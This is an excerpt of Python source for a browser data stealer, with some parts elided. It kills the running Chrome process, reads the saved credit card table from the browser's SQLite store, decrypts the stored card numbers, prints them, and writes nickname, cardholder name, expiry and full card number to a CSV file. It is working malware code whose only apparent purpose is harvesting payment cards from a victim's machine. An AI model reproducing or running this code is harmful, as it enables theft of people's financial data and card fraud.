...
#global constant set path for encryption keys and credit card data
...
data = open('credit.csv',mode='a',newline='',encoding='utf-8')
csv_writer = csv.writer(data,delimiter=',')
csv_writer.writerow(["nickname","expiry_month", "expiry_year", "card_name","card_number"])
files = ["credit.csv"]
...
def web_dump(local_state,web_data,kill,browser):
    try:
        print("########## Dumping " + browser + " Credit Cards ################")
    ...
    #Connect to sqlite database and dump card nickname,card expiry,card name and decrypted card number
    kill = subprocess.getoutput('taskkill /F /IM ' + kill +  ' /T') #kiils all running browser processes
    try:
        conn = sqlite3.connect(web_data)
        cursor = conn.cursor()
        cursor.execute("SELECT nickname,name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards") #Select statement to retrieve info 
        for index,login in enumerate(cursor.fetchall()):
            nickname = login[0]
            expiry_month = login[2]
            expiry_year = login[3]
            card_name = login[1]
            ciphertext= login[4]
            decrypted_password = decrypt_password(ciphertext, secret_key)
            print("Card Nickname:",nickname)
            print("Card Name:",card_name)
            print("Expiry:",expiry_month,"/",expiry_year)
            print("Decrypted Card Number:",decrypted_password,'\n')
            csv_writer.writerow([nickname,expiry_month,expiry_year,card_name,decrypted_password])
    except sqlite3.OperationalError:
        print(browser + " Database not found")

web_dump(CHROME_PATH_LOCAL_STATE,CHROME_PATH,"chrome.exe","Chrome")
